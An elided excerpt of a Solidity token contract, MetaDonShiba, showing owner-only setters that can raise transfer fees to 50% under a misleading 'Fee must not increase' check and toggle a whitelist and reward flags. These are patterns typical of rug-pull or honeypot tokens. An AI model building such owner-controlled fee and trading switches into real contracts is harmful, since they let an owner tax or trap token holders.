...
contract MetaDonShiba is Context, IERC20, Ownable {
    ...
    uint256 public _marketingMilipercent = 7000;
    uint256 public _buyBackMilipercent = 8000;
    ...
    constructor() {
        ...
        _whiteListEnabled = true;
        setReward(address(0), true);
        setReward(address(this), true);
        setReward(_msgSender(), true);
     ...
     * @return boolean
     */
    function setMarketingMiliper(uint256 value) external onlyOwner returns (bool) {
        _marketingMilipercent = value;
         require(_marketingMilipercent + _buyBackMilipercent  <= 50000, 'Fee must not increase');
        return true;
    }
     ...
     * @return boolean
     */
    function setBuymar(uint256 value) external onlyOwner returns (bool) {
     ...
     * @return boolean
     */
    function setMinimumDi(uint256 value) external onlyOwner returns (bool) {
     ...
     * @return boolean
     */
    function setW(bool value) public onlyOwner returns (bool) {
        _whiteListEnabled = value;
        return true;
    }

    function setNfti(bool value) public onlyOwner returns (bool) {
        _nftIntegrating = value;
        return true;
    }

    function setNft(address account, bool value) public onlyOwner returns (bool) {
     ...
     * @return boolean
     */
    function setReward(address account, bool value) public onlyOwner returns (bool) {
